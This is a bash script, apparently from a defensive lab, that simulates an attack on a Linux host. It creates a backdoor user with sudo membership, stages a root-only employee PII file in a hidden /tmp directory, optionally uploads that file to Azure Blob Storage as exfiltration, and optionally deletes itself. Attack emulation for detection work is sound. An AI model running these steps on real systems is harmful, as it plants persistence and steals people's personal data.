#!/usr/bin/env bash
# 01_attack_simulation.sh
# Simulates attacker behavior (defensive lab use only):
#  - Privilege escalation via sudo group modification (backdoor)
#  - Data theft (root-only PII file) + staging
#  - Optional cloud exfiltration to Azure Blob Storage
#  - Optional self-delete to mimic attacker cleanup

set -euo pipefail

# --- Determine "real" user home when running under sudo ---
REAL_USER="${SUDO_USER:-$USER}"

# --- Config (safe defaults; override via environment variables) ---
ATTACKER_USER="${ATTACKER_USER:-badactor}"
SECRET_FILE="${SECRET_FILE:-/home/${REAL_USER}/.secret_data/employee_records.txt}"
STAGE_DIR="${STAGE_DIR:-/tmp/.stage}"
SELF_DELETE="${SELF_DELETE:-false}"

# Optional Azure upload (ONLY runs if these are set at runtime)
AZURE_STORAGE_ACCOUNT="${AZURE_STORAGE_ACCOUNT:-}"
AZURE_STORAGE_CONTAINER="${AZURE_STORAGE_CONTAINER:-}"
AZURE_STORAGE_KEY="${AZURE_STORAGE_KEY:-}"
AZURE_BLOB_NAME="${AZURE_BLOB_NAME:-employee_records.txt}"

echo "[*] Starting attack simulation phase..."
echo "[*] Using REAL_USER=${REAL_USER}"
echo "[*] Target PII file: ${SECRET_FILE}"

# --- 1) Create attacker user (if missing) ---
if id "$ATTACKER_USER" >/dev/null 2>&1; then
  echo "[*] Attacker user '${ATTACKER_USER}' already exists."
else
  echo "[*] Creating attacker user '${ATTACKER_USER}'..."
  sudo useradd -m "$ATTACKER_USER"
fi

# --- 2) Privilege escalation (sudo group) ---
echo "[*] Attempting privilege escalation: adding '${ATTACKER_USER}' to sudo group..."
sudo usermod -aG sudo "$ATTACKER_USER"
echo "[+] '${ATTACKER_USER}' added to sudo group (simulated escalation/backdoor)."

# --- 3) Validate PII file exists (root-only) ---
echo "[*] Locating sensitive file..."
if [[ ! -f "$SECRET_FILE" ]]; then
  echo "[!] Secret file not found at: $SECRET_FILE"
  echo "    Run scripts/00_setup_lab.sh first, or override SECRET_FILE at runtime."
  exit 1
fi

# --- 4) Stage + steal data (simulate attacker collection) ---
echo "[*] Staging sensitive file to ${STAGE_DIR} ..."
sudo mkdir -p "$STAGE_DIR"
sudo cp "$SECRET_FILE" "$STAGE_DIR/"
echo "[+] Staged file at: ${STAGE_DIR}/$(basename "$SECRET_FILE")"

# --- 5) Optional cloud upload (Azure Blob) ---
if command -v az >/dev/null 2>&1 \
  && [[ -n "$AZURE_STORAGE_ACCOUNT" && -n "$AZURE_STORAGE_CONTAINER" && -n "$AZURE_STORAGE_KEY" ]]; then

  echo "[*] Azure CLI detected + runtime env vars present. Uploading staged file to Azure Blob..."
  az storage blob upload \
    --account-name "$AZURE_STORAGE_ACCOUNT" \
    --container-name "$AZURE_STORAGE_CONTAINER" \
    --account-key "$AZURE_STORAGE_KEY" \
    --file "${STAGE_DIR}/$(basename "$SECRET_FILE")" \
    --name "$AZURE_BLOB_NAME" \
    --overwrite true >/dev/null

  echo "[+] Upload complete (simulated exfiltration)."
else
  echo "[*] Skipping Azure upload (missing az CLI or required env vars)."
  echo "    To enable upload, set: AZURE_STORAGE_ACCOUNT, AZURE_STORAGE_CONTAINER, AZURE_STORAGE_KEY"
fi

# --- 6) Optional self-delete (attacker cleanup) ---
if [[ "$SELF_DELETE" == "true" ]]; then
  echo "[*] SELF_DELETE=true → removing this script to mimic attacker cleanup..."
  rm -- "$0"
  echo "[+] Script deleted."
else
  echo "[*] SELF_DELETE=false → script retained."
fi

echo "[*] Attack simulation complete."
